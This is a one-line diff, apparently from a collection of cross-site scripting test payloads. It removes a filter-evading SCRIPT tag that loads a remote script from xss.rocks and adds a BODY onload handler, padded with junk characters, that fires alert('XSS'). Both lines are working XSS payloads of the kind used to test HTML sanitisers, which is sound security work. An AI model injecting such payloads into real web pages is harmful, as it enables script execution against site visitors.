@@ -1,1 +1,1 @@
-<SCRIPT/XSS SRC="http://xss.rocks/xss.js"></SCRIPT>
+<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
